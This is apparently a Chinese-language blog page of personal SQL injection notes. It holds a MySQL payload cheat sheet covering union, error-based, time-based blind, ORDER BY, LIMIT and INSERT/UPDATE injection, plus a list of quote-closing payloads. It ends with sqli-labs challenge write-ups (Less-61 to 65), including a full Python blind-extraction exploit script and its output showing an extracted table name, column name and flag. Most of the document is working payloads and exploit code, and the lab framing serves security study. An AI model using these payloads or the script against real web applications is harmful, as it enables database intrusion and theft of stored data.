<h1 id="常用-payload"><a href="#常用-payload" class="headerlink" title="常用 payload"></a>常用 payload</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586599797233-1453d801-5d9a-479c-876c-12f33e0854ab.png#align=left&display=inline&height=705&margin=%5Bobject%20Object%5D&name=mysql-infomation.schema.png&originHeight=705&originWidth=898&size=53643&status=done&style=none&width=898" alt="mysql-infomation.schema.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586403342343-7b65273a-1679-4d86-ae09-ff008cdeece7.png#align=left&display=inline&height=349&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=572&size=35317&status=done&style=none&width=572" alt="image.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 测试！</span></span><br><span class="line"></span><br><span class="line">LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>

<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># UNION BASED</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 列出所有数据库</span></span><br><span class="line"></span><br><span class="line">union select group<span class="emphasis">_concat(SCHEMA_</span>NAME) from information_schema.SCHEMATA</span><br><span class="line"></span><br><span class="line"><span class="section"># 列出数据库 test 中的所有表(均可用 16 进制)</span></span><br><span class="line"></span><br><span class="line">union select group<span class="emphasis">_concat(TABLE_</span>name) from information<span class="emphasis">_schema.tables where table_</span>schema=<span class="code">`test`</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 列出（数据库：test 表：admin ）中所有的字段</span></span><br><span class="line"></span><br><span class="line">union select group<span class="emphasis">_concat(COLUMN_</span>NAME) from information_schema.COLUMNS where</span><br><span class="line">TABLE<span class="emphasis">_SCHEMA=`test` and TABLE_</span>NAME=<span class="code">`admin`</span></span><br><span class="line"></span><br><span class="line">UNION SELECT 1,2,group<span class="emphasis">_concat( column_</span>name,0x20)) from information_schema.columns</span><br><span class="line"></span><br><span class="line"><span class="section"># valid queries</span></span><br><span class="line"></span><br><span class="line">id=1' AND 1=2 union select 1,2,(select group<span class="emphasis">_concat() from information_</span>schema.schemata) -- +</span><br><span class="line">id=1' AND 1=2 union select 1,2,(select group<span class="emphasis">_concat() from information_</span>schema.tables where table_schema='security')-- #</span><br><span class="line">id=1' AND 1=2 union select 1,2,(select group<span class="emphasis">_concat() from information_</span>schema.columns where table_name='users') -- +</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>注意：group_concat 可以不跟 group by，但里面必须跟列名，而不能跟子查询</span><br><span class="line"><span class="bullet">- </span>回显常常有长度限制</span><br><span class="line"></span><br><span class="line"><span class="section"># ERROR BASED 报错注</span></span><br><span class="line"></span><br><span class="line">updatexml('2',concat('~',(select current_user()),'~'),'2')-- -</span><br><span class="line">extractvalue(1, concat(0x5c, (select table<span class="emphasis">_name from information_</span>schema.tables limit 1),'~'));-- -</span><br><span class="line">select from(select count(<span class="emphasis">*),concat(version(),floor(rand(0)*</span>2))x from information_schema.tables group by x )x-- -</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>concat 可用 concat<span class="emphasis">_ws 替代，也可用 group_</span>concat 整合结果</span><br><span class="line"></span><br><span class="line"><span class="section"># BLIND SQL injection 盲注，延时注</span></span><br><span class="line"></span><br><span class="line">id = 1" and sleep(0)='1' -- -</span><br><span class="line">id=1" and if(1=1, sleep(3) , 1 ) -- -</span><br><span class="line">id=1 and 1=(case when (2=2) then sleep(5) else 1 end) -- #</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>盲注似乎只能用是否延时，来确定是否闭合</span><br><span class="line"><span class="bullet">- </span>case when 后面的语句需要加括号，否则不能成功</span><br><span class="line"></span><br><span class="line"><span class="section"># 基本信息</span></span><br><span class="line"></span><br><span class="line"><span class="code">    	select @@basedir</span></span><br><span class="line"><span class="code">    	select @@datadir</span></span><br><span class="line"><span class="code">    	select current_user()</span></span><br><span class="line"></span><br><span class="line"><span class="code">    	select version()</span></span><br><span class="line"><span class="code">    	select @@version</span></span><br><span class="line"><span class="code">    	select database()</span></span><br><span class="line"><span class="code">    	select @@database</span></span><br><span class="line"></span><br><span class="line"><span class="section"># POC</span></span><br><span class="line"></span><br><span class="line">extractvalue(0X20, concat(0x5c, (VERSION（)),'~'));-- -</span><br></pre></td></tr></table></figure>

<ul>
<li>报错注入，需要语法无错误才可，<strong>该闭合的地方要闭合</strong>，如注释符（<code>-- -</code>）</li>
<li>得出结论，一般可以用盲注的地方也可以用<code>outfile|dumpfile|load_file</code>.</li>
<li>盲注可分为两类：布尔盲注+基于时间的盲注。</li>
</ul>
<p>因为没有 T/F 的回显，即从响应上看不出任何差异（响应包括：响应大小/状态码/页内文字），只好采用延时函数, 一般来说，延时函数可以用<code>sleep</code>  <code>benchmark</code>，不过下面的文章提到了一种新的延时方式。</p>
<blockquote>
<p><a href="https://www.cnblogs.com/-qing-/p/10894310.html" target="_blank" rel="noopener">MySQL 时间盲注五种延时方法 (PWNHUB 非预期解)</a></p>
</blockquote>
<h2 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h2><p><a href="https://github.com/hi-unc1e/some_scripts" target="_blank" rel="noopener">https://github.com/hi-unc1e/some_scripts</a></p>
<h2 id="Handler-注入"><a href="#Handler-注入" class="headerlink" title="Handler 注入"></a>Handler 注入</h2><p>ref</p>
<ul>
<li><a href="https://www.cnblogs.com/hello-there/p/12882991.html" target="_blank" rel="noopener">https://www.cnblogs.com/hello-there/p/12882991.html</a></li>
</ul>
<p>无列名注入（ban 逗号）</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3 <span class="xml"><span class="tag">&lt;<span class="name">=</span>&gt;</span></span></span><br><span class="line">union select \* from (select 1)a join (select 2)b join (select 3)c</span><br><span class="line"></span><br><span class="line">limit 2,1 <span class="xml"><span class="tag">&lt;<span class="name">=</span>&gt;</span></span>limit 1 offset 2</span><br></pre></td></tr></table></figure>

<h2 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h2><blockquote>
<p>order by 的注入点，SQL 预编译会解决 sql 注入问题，但是有些地方是不能参数化的。比如 order by 后就不能参数化，挖注入的时候看准 orderby、sort 参数，一挖一个准。<br>为什么 orderby 不能参数化查询？<a href="https://www.cnblogs.com/lsdb/p/12084038.html" target="_blank" rel="noopener">移步这里</a></p>
</blockquote>
<blockquote>
<p>是字符串又不能加引号（否则查询会出错）<br>预编译（参数化）会自动加引号</p>
</blockquote>
<blockquote>
<p>无法预编译 =&gt; 导致注入</p>
</blockquote>
<p>order by 语句后面发生的注入，特点如下</p>
<ul>
<li>无法作运算，即<code>sort=2</code>与<code>sort=(3-1)</code>并不相同</li>
<li>如果直接<code>if(1=2,1,SLEEP(2))</code>，sleep 时间将会变成 2*当前表中记录的数目，<strong>将会对服务器造成一定的拒绝服务攻击，</strong>建议采用子语句验证延时注入，例如<code>if(1=2,1,(select 1 from (select SLEEP(2))x))</code></li>
</ul>
<p>ref</p>
<ul>
<li><a href="https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html" target="_blank" rel="noopener">Mysql-Order-By-Injection-Summary</a></li>
<li><a href="https://xz.aliyun.com/t/7919" target="_blank" rel="noopener">渗透经验分享之 SQL 注入思路拓展 - 先知社区</a></li>
</ul>
<h2 id="LIMIT-后的注入"><a href="#LIMIT-后的注入" class="headerlink" title="**LIMIT 后的注入"></a>**LIMIT 后的注入</h2><p>报错注，payload 如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x7c,version())),rand());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># mysql&gt; select `table_name` from information_schema.tables limit 0,1 procedure analyse(extractvalue(rand(), concat(0x7c, version(),0x7c)),rand());</span></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '|5.5.44-0ubuntu0.14.04.1|'</span><br></pre></td></tr></table></figure>

<p>如果不能报错的华，可以用延时注，但是貌似不能用 sleep()，会报错<code>ERROR 1105 (HY000): Only constant XPATH queries are supported</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE analyse((<span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">MID</span>(<span class="keyword">version</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br><span class="line">// 虽然会报错，但是的确有延时</span><br><span class="line"><span class="number">1</span>‘ <span class="keyword">case</span> 为真，有延迟，延迟后报错</span><br><span class="line"><span class="number">2</span>‘ <span class="keyword">case</span> 为假，马上报错</span><br></pre></td></tr></table></figure>

<p>ref</p>
<ul>
<li><a href="https://www.cnblogs.com/qing123/p/4575901.html" target="_blank" rel="noopener">https://www.cnblogs.com/qing123/p/4575901.html</a></li>
<li><a href="https://xz.aliyun.com/t/5858" target="_blank" rel="noopener">https://xz.aliyun.com/t/5858</a></li>
</ul>
<h2 id="不插入数据的注入（INSERT-UPDATE-注入）"><a href="#不插入数据的注入（INSERT-UPDATE-注入）" class="headerlink" title="不插入数据的注入（INSERT / UPDATE 注入）"></a>不插入数据的注入（INSERT / UPDATE 注入）</h2><p>在网鼎杯中考察了一种另类的注入方式，insert 语句中在不插入数据的情况下，完成注入，使用到了 pow(999,999)报错。<br>首先，我们看看下面的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># （1=1）为真，查询出错。即(QUERY)为真时，查询会出错。</span></span><br><span class="line">mysql&gt; select `table_name` from information_schema.tables where （1=1） and pow(999,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'pow(999,999)'</span><br><span class="line"></span><br><span class="line"><span class="comment"># （1=0）为假，查询结果为空。即(QUERY)为假时，查询结果为空。</span></span><br><span class="line">mysql&gt; select `table_name` from information_schema.tables where （1=0） and pow(999,999);</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>报错 =&gt; 查询为真</li>
<li>结果为空 =&gt; 查询为假</li>
</ul>
<p>既然已经明确了 True/False 时的响应情况，你马上就可以意识到这实际就是个布尔盲注，就可以在不向数据库中插入数据的情况下，完成数据的猜解。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592584010906-15ef6e01-2828-4435-98d9-e994ea291895.png#align=left&display=inline&height=324&margin=%5Bobject%20Object%5D&name=exp999.png&originHeight=324&originWidth=1903&size=85797&status=done&style=none&width=1903" alt="exp999.png"><br><strong>成因分析</strong>（以下纯属个人理解）<br>因为<code>（QUERY）and pow(999,999)</code>是双目运算符，必须要两边都为真时才为真，一碰到假<strong>马上就</strong>会返回假，不会再进行后续的计算；也就是说，在这里<code>and</code>运行时会有三种状态，真(True)、假(False)、错误(Error)，我们就是利用的它后两种状态的区别，来实现盲注。<br><strong>总结</strong><br>1）. 当查询语句<code>QUERY</code>为假时，mysql 不会对后面的<code>pow(999,999)</code>进行计算，直接就返回<code>false</code>;<br>2）. 当查询语句<code>QUERY</code>为真时，mysql 会对后面的<code>pow(999,999)</code>进行计算，由于这个数太大已经溢出，当然就会报错。<br><strong>闭合符号</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 闭合符号</span></span><br><span class="line"></span><br><span class="line">0|()--</span><br><span class="line">0'|()--</span><br><span class="line">0"|()--</span><br><span class="line">0)|()--</span><br><span class="line">0')|()--</span><br><span class="line">0")|()--</span><br><span class="line">0))|()--</span><br><span class="line">0'))|()--</span><br><span class="line">0"))|()--</span><br><span class="line">0)))|()--</span><br><span class="line"><span class="section">#####################################</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 当单引号被过滤(去掉)</span></span><br><span class="line"></span><br><span class="line">0%df'|()--</span><br><span class="line">0%df')|()--</span><br><span class="line">0%df'))|()--</span><br><span class="line"><span class="section">#####################################</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 当双引号被过滤</span></span><br><span class="line"></span><br><span class="line">0%df"|()--</span><br><span class="line">0%df")|()--</span><br><span class="line">0%df"))|()--</span><br><span class="line"><span class="section">#####################################</span></span><br><span class="line">0'|()|''='1--</span><br><span class="line">0"|()|''='1--</span><br><span class="line">0)|()|''='1--</span><br><span class="line">0')|()|''='1--</span><br><span class="line">0")|()|''='1--</span><br><span class="line">0))|()|''='1--</span><br><span class="line">0'))|()|''='1--</span><br><span class="line">0"))|()|''='1--</span><br><span class="line">0)))|()|''='1--</span><br><span class="line"><span class="section">#####################################</span></span><br><span class="line">0'||()||''='1</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Less-65-Challenge-12"><a href="#Less-65-Challenge-12" class="headerlink" title="Less-65:Challenge-12"></a>Less-65:Challenge-12</h1><p>闭合符号是<code>&quot;)</code>，改 exp，冲！<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594118424392-b412f696-0ba2-4e37-be09-fd9a140da722.png#align=left&display=inline&height=182&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=363&originWidth=529&size=11847&status=done&style=none&width=264.5" alt="图片.png"></p>
<h1 id="Less-64-Challenge-11"><a href="#Less-64-Challenge-11" class="headerlink" title="Less-64:Challenge-11"></a>Less-64:Challenge-11</h1><p>闭合符号是<code>))</code>, 同前面两关<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594112721743-b49f3017-41f2-41ba-a551-1bfd11a8270d.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=292&originWidth=364&size=9313&status=done&style=none&width=182" alt="图片.png"></p>
<h1 id="Less-63-Challenge-10"><a href="#Less-63-Challenge-10" class="headerlink" title="Less-63:Challenge-10"></a>Less-63:Challenge-10</h1><p>闭合符号是单引号<code>&#39;</code><br>把脚本内容中的闭合符号改一改即可，美滋滋</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># less43-exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="section"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="section"># author:unc1e</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"><span class="section"># mysql&gt; select ascii('1'), (select substring(ascii('1'),1,1)), (select substring(ascii('1'),2,1));</span></span><br><span class="line"></span><br><span class="line"><span class="section"># +------------+------------------------------------+------------------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="section"># | ascii('1') | (select substring(ascii('1'),1,1)) | (select substring(ascii('1'),2,1)) |</span></span><br><span class="line"></span><br><span class="line"><span class="section"># +------------+------------------------------------+------------------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="section"># | 49 | 4 | 9 |</span></span><br><span class="line"></span><br><span class="line"><span class="section"># +------------+------------------------------------+------------------------------------+</span></span><br><span class="line"></span><br><span class="line">def str<span class="emphasis">_to_</span>hex(s):</span><br><span class="line">'''</span><br><span class="line">:param s:</span><br><span class="line">:return: 将字符串转为 0x 带头的十六进制值</span><br><span class="line">'''</span><br><span class="line">return '0x'+''.join([hex(ord(c)).replace('0x', '') for c in s])</span><br><span class="line"></span><br><span class="line"><span class="section"># initialize param</span></span><br><span class="line"></span><br><span class="line">url = "https://sec4ever.cn/Less-63/index.php?id=0' "</span><br><span class="line">reset_url ="https://sec4ever.cn/sql-connections/setup-db-challenge.php?id=&#123;&#125;".format(url.split("sec4ever.cn")[1]) # /sql-connections/setup-db-challenge.php?id=/Less-60/index.php</span><br><span class="line"></span><br><span class="line">TIMEOUT = 8</span><br><span class="line">VERIFY = True</span><br><span class="line"></span><br><span class="line">table<span class="emphasis">_name_</span>len = len('UX9CUK2CIC')</span><br><span class="line">flag_len = len('uwpeCvsrLcadsa8P7wSn9Ix4')</span><br><span class="line"></span><br><span class="line">charIndexSet = ["Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2","admin3","dhakkan","admin4"] # 字符串特征,index is from 0-9</span><br><span class="line">charIndexSet_rev = charIndexSet[::-1]</span><br><span class="line">Set = [ -3, -2, -1 ] # 取字符串 ascii 值的百位+十位+个位</span><br><span class="line"></span><br><span class="line"><span class="section"># 个位：substring((query),-1, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 十位：substring((query),-2, 1)；</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 百位 substring((query),-3, 1),</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 初始化</span></span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line">def req2getOneChar(xurl, payload, start, end):</span><br><span class="line">'''</span><br><span class="line"></span><br><span class="line"><span class="code">    :param xurl: base url</span></span><br><span class="line"><span class="code">    :param payload: (select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573)</span></span><br><span class="line"><span class="code">    :param start ,end: [start, end]</span></span><br><span class="line"><span class="code">    :return:</span></span><br><span class="line"><span class="code">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="code">    asciiValue = ['0','0','0'] # 百位，十位，个位</span></span><br><span class="line"><span class="code">    flag = ""</span></span><br><span class="line"><span class="code">    for l in range(start, end+1):</span></span><br><span class="line"><span class="code">        for k, kv in enumerate(Set):# 先获取</span></span><br><span class="line"><span class="code">            # k = 0，1，2</span></span><br><span class="line"><span class="code">            # kv = -3，-2，-1 用于substring得到ascii值的各个位上的数字</span></span><br><span class="line"><span class="code">            url = xurl + "or id=" + "substring(ascii(substring((&#123;payload&#125;), &#123;l&#125;, 1)), &#123;kv&#125;, 1)".format(payload=payload, l=l, kv=kv ) + '-- -'</span></span><br><span class="line"><span class="code">            #print(url)</span></span><br><span class="line"><span class="code">            resp = sess.get(url=url, timeout=TIMEOUT, verify=VERIFY)</span></span><br><span class="line"><span class="code">            for i in range(1, 10):# 遍历1~9的特征值for(1,10)</span></span><br><span class="line"><span class="code">                s1 = 'Your Login name : ' + charIndexSet[i]# "Dumb"</span></span><br><span class="line"><span class="code">                e1 = 'Your Password : ' + charIndexSet_rev[i]#admin4</span></span><br><span class="line"><span class="code">                if( resp.text.count(s1) &gt; 0  and resp.text.count(e1) &gt; 0):</span></span><br><span class="line"><span class="code">                    # 若页面内容中含有当前特征值，则认为当前特征值的索引是其对应位的值（0～9）</span></span><br><span class="line"><span class="code">                    # 如：页面同时含有Angelina和dhakkan，该位值为1</span></span><br><span class="line"><span class="code">                    asciiValue[k] = str(i) # 0是个位，1是百位和十位</span></span><br><span class="line"><span class="code">                    break</span></span><br><span class="line"><span class="code">                else:</span></span><br><span class="line"><span class="code">                    asciiValue[k] = '0'</span></span><br><span class="line"><span class="code">                    continue</span></span><br><span class="line"></span><br><span class="line"><span class="code">        foo = int(asciiValue[0] + asciiValue[1] + asciiValue[2])# 如'4'+'9' =&gt; 49, '10'+'2'=102</span></span><br><span class="line"><span class="code">        flag += chr(foo)    #chr(49)='1'</span></span><br><span class="line"><span class="code">        print("[-]current content is:&#123;&#125;".format(flag))</span></span><br><span class="line"><span class="code">    if flag != '':</span></span><br><span class="line"><span class="code">        return flag</span></span><br><span class="line"><span class="code">    else:</span></span><br><span class="line"><span class="code">        print("[!]req2getOneChar ERROR!")</span></span><br><span class="line"></span><br><span class="line"><span class="section"># step 1：获取表名</span></span><br><span class="line"></span><br><span class="line">def getTables(): # P79FGLN0JK</span><br><span class="line">payload = '''(select group<span class="emphasis">_concat(table_</span>name) from information<span class="emphasis">_schema.tables where table_</span>schema=0x6368616c6c656e676573)'''</span><br><span class="line">table<span class="emphasis">_name = req2getOneChar(xurl=url, payload=payload, start=1, end=table_</span>name_len)</span><br><span class="line">print("[-]table<span class="emphasis">_name is:&#123;&#125;".format(table_</span>name))</span><br><span class="line">return table_name</span><br><span class="line"></span><br><span class="line">def getColumn():</span><br><span class="line">'''</span><br><span class="line">获取列名，</span><br><span class="line">--------------------------</span><br><span class="line">内容 id,sessid,secret_Y1P6,tryy</span><br><span class="line">↑ ↑</span><br><span class="line">位置 11 21</span><br><span class="line">--------------------------</span><br><span class="line">''' # step 2：获取列名</span><br><span class="line">payload = '''(select group<span class="emphasis">_concat(column_</span>name) from information<span class="emphasis">_schema.columns where table_</span>schema=0x6368616c6c656e676573 and table<span class="emphasis">_name=&#123;table&#125;)'''.format(table=str_</span>to<span class="emphasis">_hex(table_</span>name))</span><br><span class="line">column_name = req2getOneChar(xurl=url, payload=payload, start=11, end=21)</span><br><span class="line"></span><br><span class="line"><span class="code">    if "secret" in column_name:</span></span><br><span class="line"><span class="code">        print("[+]column_name is:&#123;&#125;".format(column_name))</span></span><br><span class="line"><span class="code">        return column_name</span></span><br><span class="line"><span class="code">    else:</span></span><br><span class="line"><span class="code">        print("step2 失败！")</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 清空次数</span></span><br><span class="line"></span><br><span class="line">sess.get(url=reset_url, verify=VERIFY)</span><br><span class="line"></span><br><span class="line"><span class="section"># exploit</span></span><br><span class="line"></span><br><span class="line">table_name = getTables()</span><br><span class="line">column_name = getColumn()</span><br><span class="line"></span><br><span class="line"><span class="section"># step 3 获取 flag</span></span><br><span class="line"></span><br><span class="line">payload = '''(select &#123;&#125; from &#123;&#125;)'''.format((column<span class="emphasis">_name), (table_</span>name))</span><br><span class="line">flag = req2getOneChar(xurl=url, payload=payload, start=1, end=flag_len)</span><br><span class="line">print("[+]FLAG is:&#123;&#125;".format(flag))</span><br></pre></td></tr></table></figure>

<h1 id="Less-62-Challenge-9"><a href="#Less-62-Challenge-9" class="headerlink" title="Less-62:Challenge-9"></a>Less-62:Challenge-9</h1><p>boolean injection, close char is <code>&#39;)</code>, via <code>/Less-62/?id=1&#39;) and 1=2 -- -</code>and<code>/Less-62/?id=1&#39;) and 1=1 -- -</code><br>参考脚本<a href="https://github.com/hi-unc1e/some_scripts/blob/master/boolean_sqli_exp.py" target="_blank" rel="noopener">https://github.com/hi-unc1e/some_scripts/blob/master/boolean_sqli_exp.py</a><br>运行效果如图, 舒服<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594111563293-dccec4bc-b117-4c14-af8b-ab095114a2ea.png#align=left&display=inline&height=250&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=500&originWidth=667&size=77407&status=done&style=none&width=333.5" alt="图片.png"></p>
<h1 id="Less-61-Challenge-8"><a href="#Less-61-Challenge-8" class="headerlink" title="Less-61:Challenge-8"></a>Less-61:Challenge-8</h1><p>close_chars is <code>&#39;))</code> , can be mounted via <code>/Less-61/?id=1&#39;)) and 1=2 -- -</code><br>so adjust my exploit script, get the flag…</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+]table_name is:UX9CUK2CIC</span><br><span class="line">[+]column<span class="emphasis">_name is:secret_</span>9BN9</span><br><span class="line">[+]flag is:l55fc3v4TvJZk7GAspprtOAh</span><br></pre></td></tr></table></figure>

<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593922201970-9c162cca-f873-4380-8399-faa205c778f2.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&name=clr.png&originHeight=596&originWidth=958&size=65344&status=done&style=none&width=479" alt="clr.png"></p>
